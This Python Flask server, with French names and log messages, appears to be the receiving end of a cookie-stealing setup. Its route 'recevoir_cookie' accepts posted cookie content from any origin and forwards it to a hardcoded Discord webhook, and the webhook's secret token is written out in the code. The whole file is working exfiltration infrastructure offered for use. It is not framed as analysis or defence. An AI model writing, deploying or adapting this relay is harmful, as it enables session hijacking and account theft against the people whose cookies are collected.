from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)

WEBHOOK_URL = "https://discord.com/api/webhooks/1399751822515765360/yMPVxF07xUsKKtaeXDMnmO2mcjQm0DBYqhv8fN3Z7eR75ydo39qKyzDTrIQoFo3yGDXu"

@app.route("/", methods=["POST"])
def recevoir_cookie():
    data = request.get_json()
    print("🔍 Données reçues:", data)
    
    if not data or 'content' not in data:
        return jsonify({"error": "Bad request, 'content' missing"}), 400

    cookie_content = data['content']
    discord_data = {"content": cookie_content}

    response = requests.post(WEBHOOK_URL, json=discord_data)

    if response.status_code == 204:
        print("✅ Cookie envoyé au webhook Discord")
        return jsonify({"status": "success"}), 200
    else:
        print(f"⚠️ Erreur envoi webhook Discord: {response.status_code}, {response.text}")
        return jsonify({"error": "Discord webhook error"}), 500

@app.route("/", methods=["GET"])
def accueil():
    return "✅ Serveur backend en ligne", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)